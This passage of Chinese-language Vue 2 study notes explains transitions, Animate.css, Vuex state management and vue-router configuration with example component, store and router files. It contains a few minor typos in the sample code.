    transform: translateX(-100%); /* X轴移动 */
}
.v-enter-to,.v-leave { /* 进入的终点,离开的起点 */
    transform: translateX(0px);
}
</style>
```





## 起别名：

```vue
<template>
  <div class="txst">
    <h1>transition标签起别名</h1>
    <button @click="showName =!showName">显示/隐藏</button>
    <transition name="hello"> <!-- 起别名-定义别名 -->
        <h3 v-if="showName" >你好啊2</h3>
    </transition>
  </div>
</template>

<script>
export default {
  name: "Text2",
  data() {
    return { showName: true,}; },
};
</script>

<style scoped>/* scoped:作用域 */
h3{
  background-color: orange;
}
/* 起别名-使用别名 */
.hello-enter-active{  /* 开始：v-enter-active（注意名字不能修改） */
  animation: atguigu 1s; /* 使用关键帧 */
}
.v-leave-active{ /* 结束：v-leave-active */
  animation: atguigu 1s reverse; /* reverse：反转 */
}

/* 定义关键帧 */
@keyframes atguigu{
  from {
    transform: translate(-100%);
  }
  to{
    transform: translate(0px);
  }
}
</style>
```









## 集成第三方库：  Animate

### 安装Animate.css:

```js
npm install animate.css //安装Animate.css(仅第一次)
```

### 使用Animate

```vue
<template>
  <div class="txst">
    <h1>集成第三方库: Animate.css</h1>
    <button @click="showName = !showName">显示/隐藏</button>
    <!--  使用Animate.css库
            name：库名
            enter-active-class（进入的过程中）="animate__swing"（效果名）
            leave-active-class (离开的过程中)="animate__backOutUp"（效果名）
            -->
    <transition-group
      appear
      name="animate__animated animate__bounce"
      enter-active-class="animate__swing"
      leave-active-class="animate__backOutUp"
    >
      <h3 v-show="!showName" key="1">你好啊</h3>
      <h3 v-show="showName" key="2">尚硅谷</h3>
    </transition-group>
  </div>
</template>

<script>
// 引入Animate.css
import "animate.css";
export default {
  name: "Text5",
  data() {
    return {
      showName: true,
    };
  },
};
</script>
```

#  Vuex插件:

   vuex:专门在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于**任意组件间通信**。

   Vuex的使用时候：**多个组件需要共享数据时**。
​      ①多个组件依赖同一状态。
​      ②来自不同组件的行为需要变更同一状态。



## 安装Vuex插件：

注意： 在2022年2月7日，vue3成为了默认版本。
      vue2中，要使用Vuex的3版本。
      vue3中，要使用Vuex的4版本。

```
npm i vuex@3  //指定安装Vuex3版本
```

vuex原理图：

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E5%A4%9A%E7%BB%84%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%95%B0%E6%8D%AE-Vuex%E5%AE%9E%E7%8E%B0.png)

## Vuex浏览器目录：

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E6%B5%8F%E8%A7%88%E5%99%A8Vue%E6%8F%92%E4%BB%B6-vuex.png)

## 默认写法：

  注意：默认写法可无限套娃。

默认写法流程图：

​     备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写```dispatch```，直接编写```commit```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/Vuex%20-%20%E9%BB%98%E8%AE%A4%E5%86%99%E6%B3%95%E6%B5%81%E7%A8%8B%E5%9B%BE.png)

vuex的两种使用方式：

vuex的两种使用方式：主要是文件名改变，其他不变。

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/Vuex%E7%9A%84%E4%B8%A4%E7%A7%8D%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F.png)

### store/index.js文件：

```js
// 该文件用于创建Vuex中最为核心的store.
//引入Vue
import Vue from "vue";
// 引入Vuex插件
import Vuex from 'vuex'
// 使用Vuex插件
Vue.use(Vuex);

//准备Actions——用于响应组件中的动作。
const actions = {
     // Vuex插件-③使用Vuex插件
     // 默认写法： jia:function(context, value) {
     jia(context, value) { // 简写：
          console.log('③使用Vuex插件: ' + context, value)
          //④使用Vuex插件-调用commit
          context.commit('JIA', value) //注意：此处的JIA要大写。
     }
}
//准备Mutations——用于操作数据（state）
const mutations = {
     JIA(state, value) { //state，值
          console.log( state)
          state.sum += value;
     }
}
//准备State——用于存储数据(类似data)
const state = {
     // Vuex插件-①使用Vuex插件
     sum: 0, //当前和
}

// 创建并暴露Store-默认暴露
export default new Vuex.Store({
     actions,
     mutations,
     state
})
```

### main.js文件：

```js
/*  项目的入口文件 
     注意：脚手架先执行所有的import文件，在执行其他。
*/
...
// 引入store
// import store from './store/index';
import store from './store'; //注意：文件夹中默认使用的是index.js。
...

// 创建Vue实例对象 --vm
new Vue({
    //将App组件放入容器中
    render: h => h(App),
    store
}).$mount("#app")
```

### App组件：

```vue
<template>
  <div>
    <h1>当前求和为：{{ $store.state.sum }}</h1>
    <template class="bottom">
      <select v-model.number="n">
        <option value="1">1</option>
        <option value="2">2</option>
        <option value="3">3</option>
      </select>
      <button @click="increment">+</button>
    </template>
  </div>
</template>

<script>
    export default {
        name: "Count",
        data() { return { n: 1, /* 用户选择的数字 */ }; },
        methods: {//方法区
            increment() {
                // Vuex插件_默认写法-②使用Vuex插件
                this.$store.dispatch("jia", this.n);//方法名，参数
            }
        },
    };
</script>
```

## 默认写法套娃：

  注意：默认写法可无限套娃。例：

```js
//准备Actions——用于响应组件中的动作。
const actions = {
     // 默认写法： jia:function(context, value) {
     jia(context, value) { // 简写：
          console.log('③使用Vuex插件: ' + context, value)
          console.log('模拟此处有上百行代码~')
          //继续调用demo方法
          context.dispatch('demo', value);
     },
     demo(context, value) {
          console.log('模拟此处有上百行代码2~')
          //继续调用demo2方法
          context.dispatch('demo2', value);
     },
     demo2(context, value) {
          console.log('模拟此处有上百行代码3~')
          context.commit('JIA', value);
     }

}
```



## 简写：

​     注意：若没有网络请求或其他业务逻辑，组件中也可以越过Actions,不写dispatch,直接编写commit。

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/Vuex%20-%20%E7%AE%80%E5%86%99%E6%B5%81%E7%A8%8B%E5%9B%BE.png)

### store/index.js文件：

```js
// 该文件用于创建Vuex中最为核心的store.
//引入Vue
import Vue from "vue";
// 引入Vuex插件
import Vuex from 'vuex'
// 使用Vuex插件
Vue.use(Vuex);

//准备Actions——用于响应组件中的动作。
const actions = { }

//准备Mutations——用于操作数据（state）
const mutations = {
     JIAN(state, value) {
          state.sum -= value;
     }
}
//准备State——用于存储数据(类似data)
const state = {
     sum: 0, //当前和
}

// 创建并暴露Store-默认暴露
export default new Vuex.Store({
     actions,
     mutations,
     state
})
```

### main.js文件：

```js
/*  项目的入口文件  注意：脚手架先执行所有的import文件，在执行其他。*/
// 引入vue
import Vue from 'vue'
// 引入App组件，他是所有组件的父组件
import App from './App.vue'
// 引入store
// import store from './store/index';
import store from './store'; //注意：文件夹中默认使用的是index.js。

// 创建Vue实例对象 --vm
new Vue({
    //将App组件放入容器中
    render: h => h(App),
    store
}).$mount("#app")
```

### App组件：

```vue
<template>
  <div>
    <h1>当前求和为：{{ $store.state.sum }}</h1>
    <template class="bottom">
      <select v-model.number="n">
        <option value="1">1</option>
        <option value="2">2</option>
        <option value="3">3</option>
      </select>
      <button @click="decrement">-</button>
    </template>
  </div>
</template>

<script>
export default {
  name: "Count",
  data() {
    return {
      n: 1, //用户选择的数字
    };
  },
  methods: {//方法区
    decrement() {
      // Vuex插件_简写-②使用Vuex插件
      this.$store.commit("JIAN", this.n);
    }
  },
};
</script>
```





## getters（类似computed计算属性）:

### main.js文件：

```js
/*  项目的入口文件  注意：脚手架先执行所有的import文件，在执行其他。*/
// 引入vue
import Vue from 'vue'
// 引入App组件，他是所有组件的父组件
import App from './App.vue'
// 引入store
// import store from './store/index';
import store from './store'; //注意：文件夹中默认使用的是index.js。

// 创建Vue实例对象 --vm
new Vue({ //将App组件放入容器中
    render: h => h(App),
    store
}).$mount("#app")
```

### store/index.js文件：

```js
// 该文件用于创建Vuex中最为核心的store.

//引入Vue
import Vue from "vue";
// 引入Vuex插件
import Vuex from 'vuex'
// 使用Vuex插件
Vue.use(Vuex);

//准备Actions——用于响应组件中的动作。
const actions = { }

//准备Mutations——用于操作数据（state）
const mutations = {}

//准备State——用于存储数据(类似data)
const state = {
     // Vuex插件-①使用Vuex插件
     sum: 0, //当前和
}
//准备getters-用于将state中的数据进行加工(类似computed计算属性)
const getters = {
     bigSum(state) {
          return state.sum * 10;
     }
}
// 创建并暴露Store-默认暴露
export default new Vuex.Store({
     actions,
     mutations,
     state,
     getters
})
```

App组件：

```vue
<template>
  <div>
    <h1>当前求和为：{{ $store.state.sum }}</h1>
    <h3>当前求和放大十倍为：{{ $store.getters.bigSum }}</h3>
    <template class="bottom">
      <select v-model.number="n">
        <option value="1">1</option>
        <option value="2">2</option>
        <option value="3">3</option>
      </select>
      <button @click="increment">+</button>
    </template>
  </div>
</template>

<script>
export default {
  name: "Count",
  data() { return { n: 1, /* 用户选择的数字 */ };},
  methods: {//方法区
    increment() {// Vuex插件_默认写法-②使用Vuex插件
      this.$store.dispatch("jia", this.n);
    }
  },
};
</script>
```



## map四映射:

   注意：mapActions与mapMutations使用时，若需要传递参数，需要在模板绑定事件是传递参数，否则参数是事件对象。



### mapState:

mapState:用于帮助我们映射state中的数据为计算属性。
   对象写法：可修改名称。
   数组写法：

#### store/index.js文件:

```js
...actions,mutations 
//准备State——用于存储数据(类似data)
const state = {
     // Vuex插件-①使用Vuex插件
     sum: 0, //当前和
     school:'尚硅谷',
     subject:'前端'
}
...getters
// 创建并暴露Store-默认暴露
export default new Vuex.Store({
     actions,
     mutations,
     state,
     getters
})
```

#### 组件：

```vue
<template>
  <div>
    <h1>当前求和为：{{ sum }}</h1>  <!-- mapState函数-对象写法 -->
    <h3>当前求和放大十倍为：{{ $store.getters.bigSum }}</h3>
    <h3>我在{{ school }}，学习{{ subject }}</h3> <!-- mapState函数-对象写法 -->
    <template class="bottom">
      <select v-model.number="n">
        <option value="1">1</option>
        <option value="2">2</option>
        <option value="3">3</option>
      </select>
    </template>
  </div>
</template>
<script>
// 引入Vuex的mapstate函数
import { mapState } from "vuex";
export default {
  name: "Count",
  data() { return {n: 1, /*用户选择的数字 */ }; },
  computed: {//计算属性
  /* 借助mapState生成计算属性，从state中读取数据
     mapState函数-对象写法      ES6-解构运算符_对象 (解开对象) */
    ...mapState({sum:"sum",school:"school",subject:"subject"}),
      
    /* mapState函数-数组写法      ES6-解构运算符_数组 (解开对象) */
    ...mapState(["sum", "school", "subject"])
  },
};
</script>  
```





### mapGetters:

​    mapGetters:用于帮助我们映射getters中的数据为计算属性。
​      对象写法：可修改名称。
​      数组写法：

#### store/index.js文件：

```js
...actions,mutations
//准备State——用于存储数据(类似data)
const state = {// Vuex插件-①使用Vuex插件
     sum: 0, //当前和
     school:'尚硅谷',
     subject:'前端'
}
//准备getters-用于将state中的数据进行加工(类似computed计算属性)
const getters = {
     bigSum(state) {
          return state.sum * 10;
     }
}
// 创建并暴露Store-默认暴露
export default new Vuex.Store({
     actions,
     mutations,
     state,
     getters
})
```

#### App组件：

```vue
<template>
  <div>
    <h1>当前求和为：{{ sum }}</h1> 
    <h3>当前求和放大十倍为：{{ bigSum2 }}</h3> <!-- mapState函数-对象写法 -->
    <!-- <h3>当前求和放大十倍为：{{ bigSum }}</h3> --><!-- mapState函数-数组写法 -->
</template>
<script>
// 引入Vuex的mapstate函数
import { mapState,mapGetters } from "vuex";

export default {
  name: "Count",
  data() {
    return { n: 1, /* 用户选择的数字 */ };
  },
  computed: {//计算属性
   /* 借助mapState生成计算属性，从getters中读取数据
    mapGetters-对象写法      ES6-解构运算符_对象 (解开对象)  */
    ...mapGetters({bigSum2:"bigSum"}),

   /* mapGetters-数组写法      ES6-解构运算符_对象 (解开对象) */
    ...mapGetters(["bigSum"])
  },
};
</script>
```





### mapActions:

​     mapActions:用于帮助我们生成与actions对话的方法，既：包含$store.dispaction(xxx)函数。

#### store/index.js文件：

```js
// 该文件用于创建Vuex中最为核心的store.

//引入Vue
import Vue from "vue";
// 引入Vuex插件
import Vuex from 'vuex'
// 使用Vuex插件
Vue.use(Vuex);


//准备Actions——用于响应组件中的动作。
const actions = {// Vuex插件-③使用Vuex插件
     jiaOdd(context, value) {
          if (context.state.sum % 2) {
               context.commit("JIA", value);
          } else {
               alert("当前和不为奇数");
          }
     },
     jiaWait(context, value) {
          setTimeout(() => { //定时器
               context.commit('JIA', value);
          }, 1000);
     }
}
//准备Mutations——用于操作数据（state）
const mutations = {
     JIA(state, value) { //state，值
          console.log(state)
          state.sum += value;
     },
     JIAN(state, value) {
          state.sum -= value;
     }
}
//准备State——用于存储数据(类似data)
const state = {
     // Vuex插件-①使用Vuex插件
     sum: 0, //当前和
     school:'尚硅谷',
     subject:'前端'
}
// 创建并暴露Store-默认暴露
export default new Vuex.Store({
     actions,
     mutations,
     state,
     getters
})
```

App组件：

```vue
<template>
  <div>
    <h1>当前求和为：{{ sum }}</h1> <!-- mapState函数-数组写法 -->
    <h3>我在{{school}}，学习{{ subject }}</h3> <!-- mapState函数-数组写法 -->
    <template class="bottom">
      <select v-model.number="n">
        <option value="1">1</option>
        <option value="2">2</option>
        <option value="3">3</option>
      </select>
      <!-- mapActions方法简写-对象写法 -->
     <!--  <button @click="incrementOdd(n)">当前和为奇数再加</button>
      <button @click="incrementWait(n)">等一秒再加</button> -->
      
      <!--mapActions方法简写-数组写法  -->
      <button @click="jiaOdd(n)">当前和为奇数再加</button>
      <button @click="jiaWait(n)">等一秒再加</button>
    </template>
  </div>
</template>

<script>
// 引入Vuex的mapstate函数
import { mapState,mapGetters,mapMutations,mapActions } from "vuex";

export default {
  name: "Count",
  data() {
    return { n: 1, /* 用户选择的数字*/};
  },
  methods: { //方法区
     //  mapMutations方法简写-数组写法
   ...mapMutations(['JIA','JIAN']),

  //原始方法
   /*  incrementOdd() {
      // Vuex插件_默认写法-②使用Vuex插件
      this.$store.dispatch("jiaOdd", this.n);
    },
    incrementWait() {
      // Vuex插件_默认写法-②使用Vuex插件
      this.$store.dispatch("jiaWait", this.n);
    }, */

      /* 借助mapActions生成对应的方法，方法中会调用dispatch去联系actions。
         mapActions方法简写-对象写法 */
   //...mapActions({incrementOdd:"jiaOdd",incrementWait:"jiaWait"})
      
      /* mapActions方法简写-对象写法 */
    ...mapActions(["jiaOdd","jiaWait"])
  },
  computed: {//计算属性
   // mapState函数-数组写法      ES6-解构运算符_对象 (解开对象)
    ...mapState(["sum", "school", "subject"]),
  },
};
</script>
```





### mapMutations:

​      mapMutations:用于帮助我们生产与mutations对话的方法，既：包含$store.commit(xxx)的函数。
​      对象写法：
​      数组写法：

#### store/index.js文件：

```js
...actions

//准备Mutations——用于操作数据（state）
const mutations = {
     JIA(state, value) { //state，值
          console.log(state)
          state.sum += value;
     },
     JIAN(state, value) {
          state.sum -= value;
     }
}
//准备State——用于存储数据(类似data)
const state = {// Vuex插件-①使用Vuex插件
     sum: 0, //当前和
     school:'尚硅谷',
     subject:'前端'
}
// 创建并暴露Store-默认暴露
export default new Vuex.Store({
     actions,
     mutations,
     state,
})
```



#### App组件：

```vue
<template>
  <div>
    <h1>当前求和为：{{ sum }}</h1> <!-- mapState函数-数组写法 -->
    <h3>我在{{school}}，学习{{ subject }}</h3> <!-- mapState函数-数组写法 -->
    <template class="bottom">
      <select v-model.number="n">
        <option value="1">1</option>
        <option value="2">2</option>
        <option value="3">3</option>
      </select>
      <!--  mapMutations方法简写-对象写法 -->
     <!--  <button @click="increment(n)">+</button>
      <button @click="decrement(n)">-</button> --> 

      <!--  mapMutations方法简写-数组写法  -->
      <button @click="JIA(n)">+</button>
      <button @click="JIAN(n)">-</button>
    </template>
  </div>
</template>
<script>
// 引入Vuex的mapstate函数
import { mapState,mapGetters,mapMutations } from "vuex";

export default {
  name: "Count",
  data() {
    return { n: 1, /* 用户选择的数字 */};
  },
  methods: { //方法区
  //原始方法
  //#region 
 /*    increment() {
      // Vuex插件_默认写法-②使用Vuex插件
      this.$store.commit("JIA", this.n);
    },
    decrement() {
      // Vuex插件_默认写法-②使用Vuex插件
      this.$store.commit("JIAN", this.n);
    }, */
//#endregion

     /* mapMutations方法简写-对象写法(借助mapMutations生成对应的方法，方法中会调用commit去联系mutations) */
  //  ...mapMutations({increment:'JIA',decrement:'JIAN'}),

     /*  mapMutations方法简写-数组写法 */
   ...mapMutations(['JIA','JIAN']),
  },
  computed: {//计算属性
    // 借助mapState生成计算属性，从state中读取数据
   // mapState函数-数组写法      ES6-解构运算符_对象 (解开对象)
    ...mapState(["sum", "school", "subject"]),
  },
};
</script>
```





## 模块化和命名空间：

​      目的：让代码更好维护,让多种数据分类更加明确。

​    1.修改```store.js```

```js
//#region 求和组件相关配置 （或写在countAbout和personAbout.js文件）
const countAbout = {
  namespaced:true,//开启命名空间
  state:{x:1},
  mutations: { ... },
  actions: { ... },
  getters: {
    bigSum(state){
       return state.sum * 10
    }
  }
}
//#endregion

//#region 人员管理组件相关配置
const personAbout = {
  namespaced:true,//开启命名空间
  state:{ ... },
  mutations: { ... },
  actions: { ... }
}
//#endregion

const store = new Vuex.Store({
  modules: {
    countAbout,//countAbout组件
    personAbout //personAbout组件
  }
})
```

开启命名空间后，组件中读取state,getters,dispatch,commit数据：

```js
//============state=================
//方式一：自己直接读取
this.$store.state.personAbout.list
//方式二：借助mapState读取：
...mapState('countAbout',['sum','school','subject']),

//============getters=================
//方式一：自己直接读取 (js的[]中的所有/解析成.号。)
this.$store.getters['personAbout/firstPersonName'] 
//方式二：借助mapGetters读取：
...mapGetters('countAbout',['bigSum'])
//============dispatch=================
//方式一：自己直接dispatch
this.$store.dispatch('personAbout/addPersonWang',person)
//方式二：借助mapActions：
...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
//============commit=================
//方式一：自己直接commit
this.$store.commit('personAbout/ADD_PERSON',person)
//方式二：借助mapMutations：
...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'})
    
```



# Vue-router插件(路由)：

​     vue-router:Vue的一个插件库，专门用来实现SPA应用。（页面导航栏）
​     对SPA的应用的理解：
​          ①单页Web应用（single page web application,SPA）
​          ②整个应用只有一个完整的页面。
​          ③点击页面中的导航链接**不会刷新页面**，只会做页面的**局部更新**。
​          ④数据需要通过ajax请求获取。

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E8%B7%AF%E7%94%B1%E5%99%A8%EF%BC%8C%E8%B7%AF%E7%94%B1.png)



## 安装Vue-router:

```js
npm i vue-router@3     //指定安装vue-router3版本
```

 注意：2022/2/7号，Vue-router的默认版本为4;  
           vue-router4，只能在vue3中使用。
           vue2使用vue-router3。

 vue2中强行安装vue-router4报如下错：

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/vue-router4%E5%BC%BA%E8%A1%8C%E5%AE%89%E8%A3%85vue2%E4%B8%AD%E6%8A%A5%E9%94%99.png)

注意：
  ①**路由组件**通常存放在**pages**文件夹，**一般组件**通常存放在**components**文件夹
  ②切换/隐藏了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
  ③每个组件都要自己的$route属性，里面存储着自己的路由信息。

  ④整个应用只有一个router,可以通过组件的$router属性获取到。



## 单级路由：

### main.js文件：

```js
...
// 引入路由器
import router from './router/index.js' 

// 创建Vue实例对象 --vm
new Vue({
    //将App组件放入容器中
    render: h => h(App),
    router:router,
}).$mount("#app")
```

### pages/xxx.vue组件（）

```vue
<!-- About组件 -->
<template>
            <h2>我是About的内容</h2>
</template>

<!-- Home组件 -->
<template>
            <h2>我是Home的内容</h2>
</template>
```

### router/index.js文件：

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
// 引入组件
import About from '../pages/About.vue'
import Home from '../pages/Home.vue'

//创建并暴露一个路由器
export default new VueRouter({
    routes: [ //注意：此处的是routes,不是routers
        {
            path: '/about', //定义路由路径
            component:About //组件名
        }, {
            path: '/home',
            component:Home
        }
    ]
})
```

### App组件：

```vue
<template>
  <div>
    <div class="row">
      <Banner/>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- 原始html中我们使用a标签实现页面的跳转 -->
          <!--  Vue中借助router-link标签实现路由的切换
                  该元素被激活时的样式：active-class
                  跳转路由路径:to
             -->
          <router-link 
                class="list-group-item" 
                active-class="active" 
                to="/about">
              About</router-link>
          <router-link 
                class="list-group-item" 
                active-class="active"
                to="/home"
            >Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定组件的呈现位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>
```





## 多级路由(嵌套路由）：

### main.js文件：

```js
...
// 引入路由器
import router from './router/index.js' 

// 创建Vue实例对象 --vm
new Vue({
    //将App组件放入容器中
    render: h => h(App),
    router:router,
}).$mount("#app")
```

### pages/About,Home组件：

```vue
<!-- About组件 -->
<template>
            <h2>我是About的内容</h2>
</template>

<!-- Home组件 -->
<template>
<h2>我是Home的内容</h2>
<div>
    <ul class="nav nav-tabs">
        <li>
            <router-link 
                    class="list-group-item" 
                    to="/home/mews">News
           </router-link>
    </li>
        <li>
            <router-link 
                 class="list-group-item" 
                 to="/home/message">
                Message
            </router-link>
    </li>
    </ul>
    <ul>
        <!-- 指定组件的呈现位置 -->
        <router-view></router-view>
    </ul>
    </div>
</template>
```

### Message和News组件：

```vue
<template> <!-- Message组件 -->
<ul>
    <li>消息1</li>
    <li>消息2</li>
    <li>消息3</li>
    </ul>
</template>

<template> <!-- News组件 -->
  <ul>
    <li>message001</li>
    <li>message002</li>
    <li>message003</li>
  </ul>
</template>
```

### router/index.js文件：

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
// 引入组件
import About from '../pages/About.vue'
import Home from '../pages/Home.vue'
import Message from '../pages/Message.vue'
import News from '../pages/News.vue'

//创建并暴露一个路由器
export default new VueRouter({
    //注意：此处的是routes,不是routers
    routes: [  //一级路由
        {
            path: '/about', //定义路由路径
            component: About //组件名
        }, {
            path: '/home',
            component: Home,
            redirect: '/home/mews', // 默认路径：删除路径出现
            children: [ //二级路由/子路由   
                {  //注意：子路由默认带的路径“/”。
                    path: 'mews',
                    component: News
                }
                , {
                    path: 'message',
                    component: Message
                }, {
                    path: 'assignAuth',
                    component: Message,
                    hidden: true // 隐藏路由
                }]
        }
    ]
})
```



## 路由参数：

### 路由query参数：

#### 字符串参数：

##### router/index.js文件：

```js
//创建并暴露一个路由器
export default new VueRouter({
    //注意：此处的是routes,不是routers
    routes: [  //一级路由
        {
            path: '/about', //定义路由路径
            component: About //组件名
        }, {
            path: '/home',
            component: Home,
            children: [ //二级路由/子路由   
                {  //注意：子路由默认带的路径“/”。
                    path: 'mews',
                    component: News
                }
                , {
                    path: 'message',
                    component: Message,
                    children: [
                        {
                            path: 'detail',
                            component: Detail
                        }
                    ]
                }]
        }
    ]
})
```

##### Message组件：

```vue
    <router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">{{ m.title }}</router-link>
```

##### Detail组件：

```vue
<template>
<ul>
  <!-- 获取路由参数 -->
    <li>消息编码：{{$route.query.id}}</li>
    <li>消息标题：{{$route.query.title}}</li>
</ul>
</template>
```



#### 对象参数：*

```vue
<router-link 
      :to="{
          path:'/home/message/detail',
          query:{id:m.id,title:m.title}}">
      {{m.title}}
</router-link>
```



### 命名路由：

 命名路由:使用命名路由替代路径。

#### router/index.js文件：

```js
//创建并暴露一个路由器
export default new VueRouter({
    //注意：此处的是routes,不是routers
    routes: [  //一级路由
        {
            name:'guanyu', //命名路由-1定义命名路由
            path: '/about', //定义路由路径
            component: About //组件名
        }, {
            path: '/home',
            component: Home,
            children: [ //二级路由/子路由   
                {  //注意：子路由默认带的路径“/”。
                    path: 'mews',
                    component: News
                }]
        }
    ]
})
```

#### App组件：

```vue
<template>
  <div>
    <div class="row">
      <Banner/>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!--  Vue中借助router-link标签实现路由的切换
               该元素被激活时的样式：active-class
             命名路由-2使用命令路由：name   (命名路由替代path路径)
             -->
          <router-link 
             class="list-group-item" 
             active-class="active" 
             :to="{name:'guanyu'}">
             About
          </router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定组件的呈现位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>
```



### params参数：

   params参数：①字符串参数  ②对象参数

注意：params参数只能使用“命名路由”，不允许使用path路径。

#### router/index.js文件:

```js
//创建并暴露一个路由器
export default new VueRouter({
    //注意：此处的是routes,不是routers
    routes: [  //一级路由
        {
            name:'guanyu', //命名路由-1定义命名路由
            path: '/about', //定义路由路径
            component: About //组件名
        }, {
            path: '/home',
            component: Home,
            children: [ //二级路由/子路由   
                {  //注意：子路由默认带的路径“/”。
                    path: 'mews',
                    component: News
                }
                , {
                    path: 'message',
                    component: Message,
                    children: [
                        {
                            name:'xiangqing',//命名路由-1定义命名路由
                            path: 'detail/:id/:title', //路由参数_params参数-定义params参数
                            component: Detail
                        }
                    ]
                }]
        }
    ]
})
```

#### Message组件：

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- params参数-定义params参数,to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{ m.title }}</router-link> -->

        <!-- 跳转并携带params参数,to的对象写法
             命名路由-2使用命令路由：name   (命名路由替代path路径)
              params参数-定义params参数
              注意：params参数只能使用“命名路由”，不允许使用path路径。
          -->
        <router-link 
          :to="{
            name:'xiangqing',
            params:{
              id:m.id,
              title:m.title
            }
          }">
          {{m.title}}
          </router-link>
      </li>
    </ul>

    <!--  -->
    <router-view> </router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data() {
    return {
      messageList: [
        { id: "001", title: "消息001" },
        { id: "002", title: "消息002" },
        { id: "003", title: "消息003" },
      ],
    };
  },
};
</script>
```

#### Detail组件：

```vue
<template>
<ul>
  <!-- 获取路由参数-params参数 -->
    <li>消息编码：{{$route.params.id}}</li>
    <li>消息标题：{{$route.params.title}}</li>
</ul>
</template>

<script>
export default {
  name: "Detail",
  mounted() {
    console.log(this.$route)
  },
};
</script>
```



### 路由props：

作用：让路由组件更方便的收到参数。

#### 对象写法：

##### router/index.js文件：

```js
//创建并暴露一个路由器
export default new VueRouter({
    //注意：此处的是routes,不是routers
    routes: [  //一级路由
        ...
        {
            path: 'message', //路径
            component: Message, //主机名
            children: [
                {
                    name: 'xiangqing',//命名路由-1定义命名路由
                    path: 'detail/:id/:title', //路由参数_params参数-定义params参数
                    component: Detail,
                    /* props方法1-对象写法:该对象中的所有key,value都会以props的形式传递给Detail组件 */
                    props:{a:1,b:"hello"} 
                }
            ]
        }]
}
                             ]
                             })
```

##### Detail组件：

```vue
<template>
<ul>
    <li>a:{{id}}</li>
    <li>b:{{title}}</li>
    </ul>
</template>

<script>
    export default {
        name: "Detail",
        props:['a',"b"], //接收路由参数：props方法1-对象写法
        mounted() {
            console.log(this.$route)
        },
    };
</script>
```



#### 布尔值写法：

​     props方法2-布尔值写法：若布尔值为真，就会把该路由组件收到的所有params参数，以props的形式传给Detail组件。

##### Message组件：

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转并携带params参数,to的对象写法
             命名路由-2使用命令路由：name   (命名路由替代path路径)
              params参数-定义params参数
              注意：params参数只能使用“命名路由”，不允许使用path路径。
          -->
        <router-link 
          :to="{
            name:'xiangqing',
            params:{
              id:m.id,
              title:m.title
            }
          }">
          {{m.title}}
          </router-link>
      </li>
    </ul>
    <!--  -->
    <router-view> </router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data() {
    return {
      messageList: [
        { id: "001", title: "消息001" },
        { id: "002", title: "消息002" },
        { id: "003", title: "消息003" },
      ],
    };
  },
};
</script>
```

##### router/index.js文件：

```js
//创建并暴露一个路由器
export default new VueRouter({
    //注意：此处的是routes,不是routers
    routes: [  //一级路由
        ...
        {
            path: 'message', //路径
            component: Message, //主机名
            children: [
                {
                    name: 'xiangqing',//命名路由-1定义命名路由
                    path: 'detail/:id/:title', //路由参数_params参数-定义params参数
                    component: Detail,
                 /*  props方法2-布尔值写法：若布尔值为真，就会把该路由组件收到的所有params参数，以props的形式传给Detail组件。 */
                    props:true
                }
            ]
        }]
}
                             ]
                             })
```

##### Detail组件：

```vue
<template>
<ul>
    <li>a:{{id}}</li>
    <li>b:{{title}}</li>
</ul>
</template>

<script>
export default {
  name: "Detail",
  props:['id',"title"], //接收路由参数：props方法2-布尔值写法
  mounted() {
    console.log(this.$route)
  },
};
</script>
```

#### 函数写法:

##### Message组件：

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转并携带params参数,to的对象写法
             命名路由-2使用命令路由：name   (命名路由替代path路径)
              params参数-定义params参数
              注意：params参数只能使用“命名路由”，不允许使用path路径。
          -->
        <router-link 
          :to="{
            name:'xiangqing',
            params:{
              id:m.id,
              title:m.title
            }
          }">
          {{m.title}}
          </router-link>
      </li>
    </ul>
    <!--  -->
    <router-view> </router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data() {
    return {
      messageList: [
        { id: "001", title: "消息001" },
        { id: "002", title: "消息002" },
        { id: "003", title: "消息003" },
      ],
    };
  },
};
</script>
```

##### router/index.js文件：

```js
